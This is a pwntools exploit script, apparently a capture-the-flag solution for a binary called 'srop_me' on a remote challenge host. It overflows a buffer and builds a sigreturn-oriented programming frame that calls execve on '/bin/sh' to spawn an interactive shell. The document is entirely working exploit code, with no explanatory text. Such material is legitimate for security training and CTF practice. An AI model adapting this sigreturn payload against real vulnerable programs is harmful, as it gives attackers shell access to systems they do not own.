from pwn import *

binary = context.binary = ELF("./srop_me")

# vuln =  0x401000
vuln_addr = binary.symbols['vuln']
syscall_addr = 0x401031
binsh = 0x40200f

if args.REMOTE:
    p = remote('challs.n00bzunit3d.xyz', 38894)
elif args.GDB:
    p = gdb.debug(binary.path, gdbscript="""unset env LINES
unset env COLUMNS
b *vuln""")
else:
    p = process(binary.path)

frame = SigreturnFrame()
frame.rip = syscall_addr
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0

payload = b""
payload += b"A" * 0x20
payload += p64(vuln_addr)
payload += p64(syscall_addr)
payload += bytes(frame)

with open("payload", "wb") as fp:
    fp.write(payload)

p.recvuntil(b"Hello, world!!\n")
p.sendline(payload)

p.recvuntil(b"Hello, world!!\n")
p.sendline("A" * 14)

p.interactive()